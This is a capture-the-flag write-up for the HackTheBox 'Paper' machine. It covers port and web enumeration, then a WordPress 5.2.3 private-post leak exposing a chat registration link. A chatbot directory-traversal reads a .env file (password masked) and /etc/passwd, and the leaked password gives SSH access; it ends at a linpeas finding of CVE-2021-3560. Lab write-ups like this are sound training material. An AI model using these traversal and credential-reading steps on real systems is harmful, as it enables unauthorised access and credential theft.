# HackTheBox - Paper

[Room link](https://app.hackthebox.com/machines/Paper)

---

<br>

## Enumeration

Simple nmap :

```bash
$ sudo nmap -sS -oN nmap.txt 10.10.11.143
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

<br>

Simple map with script execution and versions

```bash
$ sudo nmap -p22,80,443 -sC -sV -oN nmap-openports-1.txt 10.10.11.143
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_http-title: HTTP Server Test Page powered by CentOS
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

<br>

Nmap every ports : No more open ports.

```bash
$ sudo nmap -sS -p- -oN nmap-full.txt 10.10.11.143
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

---

<br>

Web content discovery of website on port 80.

Simple dirb :

```bash
$ dirb http://10.10.11.143/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jun 12 21:21:44 2022
URL_BASE: http://10.10.11.143/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.11.143/ ----
+ http://10.10.11.143/cgi-bin/ (CODE:403|SIZE:199)                                   
==> DIRECTORY: http://10.10.11.143/manual/                                           
                                                                                     
---- Entering directory: http://10.10.11.143/manual/ ----
==> DIRECTORY: http://10.10.11.143/manual/developer/                                 
==> DIRECTORY: http://10.10.11.143/manual/faq/                                       
==> DIRECTORY: http://10.10.11.143/manual/howto/                                     
==> DIRECTORY: http://10.10.11.143/manual/images/                                    
+ http://10.10.11.143/manual/index.html (CODE:200|SIZE:9164)                         
+ http://10.10.11.143/manual/LICENSE (CODE:200|SIZE:11358)                           
==> DIRECTORY: http://10.10.11.143/manual/misc/                                      
==> DIRECTORY: http://10.10.11.143/manual/mod/                                       
==> DIRECTORY: http://10.10.11.143/manual/programs/                                  
==> DIRECTORY: http://10.10.11.143/manual/ssl/                                       
==> DIRECTORY: http://10.10.11.143/manual/style/ 
```

Nikto

```bash
$ nikto -C all -h http://10.10.11.143/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.143
+ Target Hostname:    10.10.11.143
+ Target Port:        80
+ Start Time:         2022-06-12 21:42:18 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-backend-server' found, with contents: office.paper
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.                                      
+ OSVDB-3268: /manual/images/: Directory indexing found.                              
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26495 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2022-06-12 21:56:04 (GMT2) (826 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested  
```

Look at this line "Uncommon header 'x-backend-server' found, with contents: office.paper". So, we can add office.paper on /etc/hosts and reexecute dirb

```bash
$ dirb http://office.paper
---- Scanning URL: http://office.paper/ ----
+ http://office.paper/cgi-bin/ (CODE:403|SIZE:199)                                                                                                                              
+ http://office.paper/index.php (CODE:301|SIZE:1)                                                                                                                               
==> DIRECTORY: http://office.paper/manual/                                                                                                                                      
==> DIRECTORY: http://office.paper/wp-admin/                                                                                                                                    
==> DIRECTORY: http://office.paper/wp-content/                                                                                                                                  
==> DIRECTORY: http://office.paper/wp-includes/
```

We can visite this website now -> http://office.paper/

This is a blog about paper company and one user called : Prisonmike

Let's check if we see more information about wordpress :

```bash
$ wp-scan -v --url http://office.paper/
[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
 |  - X-Powered-By: PHP/7.2.24
 |  - X-Backend-Server: office.paper
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://office.paper/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
 | Found By: Rss Generator (Passive Detection)
 [...]
```

Now, we know that is Wordpress version 5.2.3

```bash
$ searchsploit --id wordpress 5.2.3
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                 |  EDB-ID
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Core 5.2.3 - Cross-Site Host Modification                                                                                            | 47361
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                        | 47690
[...]

$ searchsploit -m 47690
```

---

<br>

Web content discovery of website on port 443.

Simple dirb :

```bash
$ dirb https://localhost.localdomain/                                          130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jun 12 22:12:36 2022
URL_BASE: https://localhost.localdomain/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://localhost.localdomain/ ----
+ https://localhost.localdomain/cgi-bin/ (CODE:403|SIZE:199)                          
==> DIRECTORY: https://localhost.localdomain/manual/                                  
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/ ----
==> DIRECTORY: https://localhost.localdomain/manual/developer/                        
==> DIRECTORY: https://localhost.localdomain/manual/faq/                              
==> DIRECTORY: https://localhost.localdomain/manual/howto/                            
==> DIRECTORY: https://localhost.localdomain/manual/images/                           
+ https://localhost.localdomain/manual/index.html (CODE:200|SIZE:9164)                
+ https://localhost.localdomain/manual/LICENSE (CODE:200|SIZE:11358)                  
==> DIRECTORY: https://localhost.localdomain/manual/misc/                             
==> DIRECTORY: https://localhost.localdomain/manual/mod/                              
==> DIRECTORY: https://localhost.localdomain/manual/programs/                         
==> DIRECTORY: https://localhost.localdomain/manual/ssl/                              
==> DIRECTORY: https://localhost.localdomain/manual/style/                            
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/developer/ ----
+ https://localhost.localdomain/manual/developer/index.html (CODE:200|SIZE:6065)      
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/faq/ ----
+ https://localhost.localdomain/manual/faq/index.html (CODE:200|SIZE:3686)            
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/howto/ ----
+ https://localhost.localdomain/manual/howto/index.html (CODE:200|SIZE:8632)          
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/misc/ ----
+ https://localhost.localdomain/manual/misc/index.html (CODE:200|SIZE:5166)           
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/mod/ ----
+ https://localhost.localdomain/manual/mod/index.html (CODE:200|SIZE:23070)           
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/programs/ ----
+ https://localhost.localdomain/manual/programs/index.html (CODE:200|SIZE:6749)       
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/ssl/ ----
+ https://localhost.localdomain/manual/ssl/index.html (CODE:200|SIZE:5088)            
                                                                                      
---- Entering directory: https://localhost.localdomain/manual/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

```

Nikto

```bash
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=US/O=Unspecified/CN=localhost.localdomain/emailAddressroot@localhost.localdomain
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=US/O=Unspecified/OU=ca-3899279223185377061/CN=localhos.localdomain/emailAddress=root@localhost.localdomain
+ Start Time:         2022-06-12 22:08:18 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent t protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
+ The X-Content-Type-Options header is not set. This could allow the user agent to rener the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.2.24
+ Hostname '10.10.11.143' does not match certificate's names: localhost.localdomain
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
```


## Exploitation

If we type this url : http://office.paper/?static=1 we have a secret information.

```txt
# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY
```

So, we have an acces to a private chat company. We can register an account and access to the channel called "general". After reading, we have an access to a bot. But in this channel we have a read only role.

For interract with bot, we can create a new channel and add it to this channel.

After played with recyclops, we can find authnetication information about recyclops. Use the chat as follow 

```txt
> recyclops list ../hubot
> ecyclops file ../hubot/start_bot.sh
Bot
7:19 PM
<!=====Contents of file ../hubot/start_bot.sh=====>
#!/bin/bash
cd /home/dwight/hubot
source /home/dwight/hubot/.env
/home/dwight/hubot/bin/hubot
#cd -
<!=====Contents of file ../hubot/start_bot.sh=====>

>  recyclops file ../hubot/.env
Bot
7:19 PM
<!=====Contents of file ../hubot/.env=====>
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=*************
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1

>  recyclops file ../../../etc/passwd
[...]
dwight:x:1004:1004::/home/dwight:/bin/bash
```

We can't connect us as recyclops on Rocketchat. But we can try to connect us through ssh on the target machine as dwight user. It works !

```bash
$ ssh dwight@office.paper                                                                                                                                                130 ⨯
dwight@office.paper's password: 
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Tue Feb  1 09:14:33 2022 from 10.10.14.23
[dwight@paper ~]$
```


---

<br>

## User flag

The user flag is in /home/dwight/user.txt

```bash
$ cat ~/user.txt
```

---

<br>

## Root flag

Execute linpeas.sh

```bash
$ linpeas.sh
[...]
╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                  
Sudo version 1.8.29                                                                                                                                                              

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560 
```


